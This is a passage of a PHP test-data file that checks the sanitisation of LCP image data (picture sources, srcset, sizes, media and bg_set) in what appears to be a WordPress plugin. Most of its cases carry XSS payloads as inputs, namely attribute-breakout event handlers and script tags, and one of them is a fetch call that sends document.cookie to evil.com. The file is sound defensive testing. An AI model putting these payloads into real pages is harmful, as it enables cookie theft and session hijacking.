						'label' => 'lcp',
						'type'  => 'img',
						'src'   => 'http://example.org/path/to/images/image.svg',
					],
				]
			),
			'results' => json_encode(
				[
					'lcp' => [
						(object) [
							'label' => 'lcp',
							'type'  => 'img',
							'src'   => 'http://example.org/path/to/images/image.svg',
						],
					]
				],
			),
			'filetype' => [
				'ext' => 'svg',
				'type' => 'image/svg+xml',
			],
			'allowed_mime_types' => [
				'jpg|jpeg|jpe'                 => 'image/jpeg',
				'gif'                          => 'image/gif',
				'png'                          => 'image/png',
				'bmp'                          => 'image/bmp',
				'tiff|tif'                     => 'image/tiff',
				'webp'                         => 'image/webp',
				'avif'                         => 'image/avif',
				'ico'                          => 'image/x-icon',
				'heic'                         => 'image/heic',
			],
		],
		'expected' => [
			'images_valid_sources' => [],
			'item'    => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/path/to/images/image.svg',
					],
				),
				'viewport' 		=> '[]',
				'last_accessed' => '2024-01-01 00:00:00',
				'error_message' => '',
			],
			'result'  => true,
			'message' => [
				'url'           => 'http://example.org',
				'is_mobile'     => false,
				'status'        => 'completed',
				'error_message' => '',
				'lcp'           => json_encode(
					(object) [
						'type' => 'img',
						'src'  => 'http://example.org/path/to/images/image.svg',
					],
				),
				'viewport' 		=> '[]',
				'last_accessed' => '2024-01-01 00:00:00',
			],
		],
	],

	// ========================================================================
	// XSS VULNERABILITY TEST CASES - Picture Sources
	// ========================================================================

	/**
	 * Test Case: XSS attempt via srcset with onerror event handler
	 * Should sanitize/reject malicious srcset containing event handlers
	 */
	'testXSSInSrcsetOnerror' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode([
				'lcp' => [
					[
						'type'    => 'picture',
						'src'     => 'http://example.org/wp-content/uploads/image.jpg',
						'srcset'  => '',
						'sizes'   => '',
						'sources' => [
							[
								'srcset' => 'image.avif" onerror="alert(document.domain)',
								'media'  => '',
								'type'   => 'image/avif',
								'sizes'  => '',
							],
						],
						'label'   => 'lcp',
					],
				],
			]),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext' => 'avif',
				'type' => 'image/avif',
			],
		],
		'expected' => [
			'result' => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],
	/**
	 * Test Case: XSS attempt via srcset with onload event handler
	 * Should sanitize/reject malicious srcset containing onload
	 */
	'testXSSInSrcsetOnload' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => 'image.webp" onload="fetch(\'https://evil.com?c=\'+document.cookie)',
									'media'  => '',
									'type'   => 'image/webp',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'webp',
				'type' => 'image/webp',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],
	/**
	 * Test Case: XSS attempt via media attribute
	 * Should sanitize/reject malicious media query containing event handlers
	 */
	'testXSSInMediaAttribute' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => 'image.avif',
									'media'  => 'screen" onfocus="alert(1)',
									'type'   => 'image/avif',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => [
				'jpg|jpeg|jpe' => 'image/jpeg',
				'png'          => 'image/png',
				'gif'          => 'image/gif',
				'webp'         => 'image/webp',
				'avif'         => 'image/avif',
			],
			'filetype' => [
				'ext'  => 'avif',
				'type' => 'image/avif',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[{"srcset":"image.avif","media":"","type":"image\/avif","sizes":""}]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[{"srcset":"image.avif","media":"","type":"image\/avif","sizes":""}]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],
	/**
	 * Test Case: XSS attempt via sizes attribute
	 * Should sanitize/reject malicious sizes containing event handlers
	 */
	'testXSSInSizesAttribute' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => 'image.avif',
									'media'  => '',
									'type'   => 'image/avif',
									'sizes'  => '100vw" onload="alert(document.domain)',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'avif',
				'type' => 'image/avif',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[{"srcset":"image.avif","media":"","type":"image\/avif","sizes":""}]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[{"srcset":"image.avif","media":"","type":"image\/avif","sizes":""}]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: XSS attempt with HTML angle brackets in srcset
	 * Should reject srcset containing < or > characters
	 */
	'testXSSWithAngleBrackets' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => 'image.avif<script>alert(1)</script>',
									'media'  => '',
									'type'   => 'image/avif',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'avif',
				'type' => 'image/avif',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url'          => 'http://example.org/test-page',
				'is_mobile'    => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport'     => json_encode( [] ),
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: XSS attempt with single quotes in srcset
	 * Should reject srcset containing single quotes
	 */
	'testXSSWithSingleQuotes' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => "image.avif' onclick='alert(1)",
									'media'  => '',
									'type'   => 'image/avif',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'avif',
				'type' => 'image/avif',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: XSS attempt with multiple event handlers in one source
	 * Should reject source with multiple XSS vectors
	 */
	'testXSSMultipleEventHandlers' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => 'image.avif" onerror="alert(1)',
									'media'  => 'screen" onfocus="alert(2)',
									'type'   => 'image/avif',
									'sizes'  => '100vw" onload="alert(3)',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'avif',
				'type' => 'image/avif',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: XSS attempt across multiple sources
	 * Should reject entire picture if any source contains malicious content
	 */
	'testXSSMultipleSources' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => 'image.avif',
									'media'  => '',
									'type'   => 'image/avif',
									'sizes'  => '',
								],
								[
									'srcset' => 'image.webp" onerror="alert(1)',
									'media'  => '',
									'type'   => 'image/webp',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'avif',
				'type' => 'image/avif',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[{"srcset":"image.avif","media":"","type":"image\/avif","sizes":""}]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[{"srcset":"image.avif","media":"","type":"image\/avif","sizes":""}]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: Invalid MIME type (text/html)
	 * Should reject sources with non-image MIME types
	 */
	'testInvalidMimeTypeHTML' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => 'malicious.html',
									'media'  => '',
									'type'   => 'text/html',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => false,
				'type' => false,
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: Invalid MIME type (application/javascript)
	 * Should reject sources with JavaScript MIME type
	 */
	'testInvalidMimeTypeJavaScript' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => 'script.js',
									'media'  => '',
									'type'   => 'application/javascript',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => false,
				'type' => false,
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	// ========================================================================
	// XSS VULNERABILITY TEST CASES - img-srcset
	// ========================================================================

	/**
	 * Test Case: XSS attempt via img-srcset's srcset with onerror event handler
	 * The srcset is rejected, nothing from it is stored, and the LCP falls back to a src-only img.
	 */
	'testXSSInImgSrcsetOnerror' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'   => 'img-srcset',
							'src'    => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset' => 'image.jpg" onerror="alert(1)',
							'sizes'  => '',
							'label'  => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'jpg',
				'type' => 'image/jpeg',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"img","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg"}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"img","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg"}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: XSS attempt via img-srcset's srcset with angle brackets/<script>
	 * The srcset is rejected, nothing from it is stored, and the LCP falls back to a src-only img.
	 */
	'testXSSInImgSrcsetAngleBrackets' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'   => 'img-srcset',
							'src'    => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset' => 'image.jpg<script>alert(1)</script>',
							'sizes'  => '',
							'label'  => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'jpg',
				'type' => 'image/jpeg',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"img","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg"}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"img","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg"}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: XSS attempt via img-srcset's srcset with quote-breakout
	 * The srcset is rejected, nothing from it is stored, and the LCP falls back to a src-only img.
	 */
	'testXSSInImgSrcsetSingleQuotes' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'   => 'img-srcset',
							'src'    => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset' => "image.jpg' onclick='alert(1)",
							'sizes'  => '',
							'label'  => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'jpg',
				'type' => 'image/jpeg',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"img","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg"}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"img","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg"}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: hostile `sizes` with an otherwise-valid `srcset`
	 * The object is kept, `srcset` is stored normally, `sizes` falls back to ''.
	 */
	'testXSSInImgSizesAttribute' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'   => 'img-srcset',
							'src'    => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset' => 'http://example.org/wp-content/uploads/image-480.jpg 480w, http://example.org/wp-content/uploads/image-800.jpg 800w',
							'sizes'  => '100vw" onload="alert(1)',
							'label'  => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'jpg',
				'type' => 'image/jpeg',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => json_encode(
					(object) [
						'type'   => 'img-srcset',
						'src'    => 'http://example.org/wp-content/uploads/image.jpg',
						'srcset' => 'http://example.org/wp-content/uploads/image-480.jpg 480w, http://example.org/wp-content/uploads/image-800.jpg 800w',
						'sizes'  => '',
					]
				),
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => json_encode(
					(object) [
						'type'   => 'img-srcset',
						'src'    => 'http://example.org/wp-content/uploads/image.jpg',
						'srcset' => 'http://example.org/wp-content/uploads/image-480.jpg 480w, http://example.org/wp-content/uploads/image-800.jpg 800w',
						'sizes'  => '',
					]
				),
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: missing/empty `srcset` on an img-srcset object
	 * The srcset is rejected, nothing from it is stored, and the LCP falls back to a src-only img, same as an explicitly empty string.
	 */
	'testImgSrcsetMissingField' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'  => 'img-srcset',
							'src'   => 'http://example.org/wp-content/uploads/image.jpg',
							'sizes' => '',
							'label' => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'jpg',
				'type' => 'image/jpeg',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"img","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg"}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"img","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg"}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: legitimate multi-descriptor srcset + valid sizes
	 * Proves Acceptance Criterion 1 - no regression for valid img-srcset payloads.
	 */
	'testValidImgSrcset' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'   => 'img-srcset',
							'src'    => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset' => 'http://example.org/wp-content/uploads/image-480.jpg 480w, http://example.org/wp-content/uploads/image-800.jpg 800w',
							'sizes'  => '(max-width: 600px) 480px, 800px',
							'label'  => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'jpg',
				'type' => 'image/jpeg',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => json_encode(
					(object) [
						'type'   => 'img-srcset',
						'src'    => 'http://example.org/wp-content/uploads/image.jpg',
						'srcset' => 'http://example.org/wp-content/uploads/image-480.jpg 480w, http://example.org/wp-content/uploads/image-800.jpg 800w',
						'sizes'  => '(max-width: 600px) 480px, 800px',
					]
				),
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => json_encode(
					(object) [
						'type'   => 'img-srcset',
						'src'    => 'http://example.org/wp-content/uploads/image.jpg',
						'srcset' => 'http://example.org/wp-content/uploads/image-480.jpg 480w, http://example.org/wp-content/uploads/image-800.jpg 800w',
						'sizes'  => '(max-width: 600px) 480px, 800px',
					]
				),
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: bg_set item carries an extra attacker-added property
	 * Only `src` (sanitized) should survive into the stored object.
	 */
	'testBgSetExtraPropertyStripped' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'   => 'bg-img',
							'src'    => '',
							'bg_set' => [
								[
									'src'     => 'http://example.org/anotherlcp.jpg',
									'onerror' => 'alert(document.domain)',
								],
							],
							'label'  => 'lcp',
						],
					],
				]
			),
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => json_encode(
					(object) [
						'type'   => 'bg-img',
						'bg_set' => [
							[
								'src' => 'http://example.org/anotherlcp.jpg',
							],
						],
						'src'    => '',
					]
				),
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => json_encode(
					(object) [
						'type'   => 'bg-img',
						'bg_set' => [
							[
								'src' => 'http://example.org/anotherlcp.jpg',
							],
						],
						'src'    => '',
					]
				),
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	// ========================================================================
	// EDGE CASES
	// ========================================================================

	/**
	 * Test Case: Empty sources array
	 * Should handle empty sources gracefully
	 */
	'testEmptySourcesArray' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'jpg',
				'type' => 'image/jpeg',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: Missing required srcset field
	 * Should reject source missing srcset
	 */
	'testMissingSrcsetField' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => '',
									'media'  => '',
									'type'   => 'image/avif',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => 'avif',
				'type' => 'image/avif',
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => '{"type":"picture","src":"http:\/\/example.org\/wp-content\/uploads\/image.jpg","sources":[]}',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],

	/**
	 * Test Case: Missing required type field
	 * Should reject source missing MIME type
	 */
	'testMissingTypeField' => [
		'config' => [
			'filter'  => true,
			'url'     => 'http://example.org/test-page/',
			'is_mobile' => false,
			'results' => json_encode(
				[
					'lcp' => [
						[
							'type'    => 'picture',
							'src'     => 'http://example.org/wp-content/uploads/image.jpg',
							'srcset'  => '',
							'sizes'   => '',
							'sources' => [
								[
									'srcset' => '/wp-content/uploads/image.avif',
									'media'  => '',
									'type'   => '',
									'sizes'  => '',
								],
							],
							'label'   => 'lcp',
						],
					],
				]
			),
			'allowed_mime_types' => $mime_types,
			'filetype' => [
				'ext'  => false,
				'type' => false,
			],
		],
		'expected' => [
			'result'  => true,
			'message' => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'status' => 'completed',
				'error_message' => '',
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
			],
			'item'    => [
				'url' => 'http://example.org/test-page',
				'is_mobile' => false,
				'lcp' => 'not found',
				'viewport' => '[]',
				'last_accessed' => null,
				'status' => 'completed',
				'error_message' => '',
			],
		],
	],
	/**
	 * Test Case: img-srcset with decimal density descriptors (issue #8931)
	 * Decimal `x` densities are valid HTML; the object must be stored unchanged.
	 */
	'testImgSrcsetDecimalDensity' => $srcset_descriptor_case(
		[
			'type'   => 'img-srcset',
			'src'    => 'http://example.org/wp-content/uploads/venice.jpg',
			'srcset' => 'http://example.org/wp-content/uploads/venice-1x.jpg 1x, http://example.org/wp-content/uploads/venice-1_5x.jpg 1.5x, http://example.org/wp-content/uploads/venice-2_25x.jpg 2.25x, http://example.org/wp-content/uploads/venice-half.jpg .5x',
			'sizes'  => '',
		],
		json_encode(
			(object) [
				'type'   => 'img-srcset',
				'src'    => 'http://example.org/wp-content/uploads/venice.jpg',
				'srcset' => 'http://example.org/wp-content/uploads/venice-1x.jpg 1x, http://example.org/wp-content/uploads/venice-1_5x.jpg 1.5x, http://example.org/wp-content/uploads/venice-2_25x.jpg 2.25x, http://example.org/wp-content/uploads/venice-half.jpg .5x',
